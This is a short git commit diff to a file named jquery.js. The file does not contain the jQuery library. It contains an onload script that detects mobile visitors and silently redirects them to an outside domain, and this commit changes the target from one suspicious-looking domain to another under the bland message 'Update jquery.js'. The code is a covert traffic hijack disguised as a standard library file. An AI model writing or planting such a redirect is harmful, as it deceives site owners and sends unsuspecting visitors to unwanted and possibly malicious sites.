97b00a11c7c04a90a23fe799b7ba020d5c96b2f2
semaofuli <135287351+semaofuli@users.noreply.github.com>
2024-12-27 11:06:07 +0800

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -2,7 +2,7 @@ window.onload=function(){
 	let hours = new Date().getHours();//拿到当前小时
 	//if(String(hours) === '22' || String(hours) === '0'){
 		if (isMobile()) {
-			window.location.href="http://24av.cfd";
+			window.location.href="http://caoliu8.click";
 			} else {
 				
 			}
